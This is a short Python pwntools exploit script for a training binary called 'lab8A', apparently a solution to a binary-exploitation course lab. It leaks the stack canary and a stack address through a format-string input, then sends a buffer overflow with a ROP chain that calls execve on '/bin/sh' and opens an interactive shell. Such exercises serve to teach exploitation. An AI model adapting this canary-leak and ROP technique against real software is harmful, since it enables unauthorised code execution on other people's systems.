from pwn import *

POP_EAX = 0x080bc506
POP_EBX = 0x080481c9
POP_ECX = 0x080e71c5
POP_EDX = 0x0806f22a

SYSCALL = 0x0806f8ff

p = process("./lab8A")
gdb_cmds = [
    #"br *0x8050260\n", # printf
    "br *" + hex(SYSCALL) + "\n",
    #"br *0x0804912d\n",
    #"br *0x0804916b\n",
    "continue\n"
]

#gdb.attach(p, ''.join(gdb_cmds))
p.sendlineafter("[+] Enter Your Favorite Author's Last Name: ", "%130$p.%131$p./bin/sh")
canary = int(p.recvuntil(".")[2:-1],16)
some_stack_addr = int(p.recvuntil(".")[2:-1],16)
pos_bin_sh = some_stack_addr - 0x21a
log.success("Canary: " + hex(canary))

p.sendlineafter("What were you thinking, that isn't a good book.", "A")
payload = "A" * 16
payload += p32(0xdeadbeef)
payload += "A" * 4
payload += p32(canary)
payload += "A" * 4
payload += p32(POP_EDX)
payload += p32(0x0)
payload += p32(POP_ECX)
payload += p32(0x0)
payload += p32(POP_EBX)
payload += p32(pos_bin_sh)
payload += p32(POP_EAX)
payload += p32(0xb)
payload += p32(SYSCALL)

p.sendlineafter("..I like to read ^_^ <==  ", payload)
p.interactive()
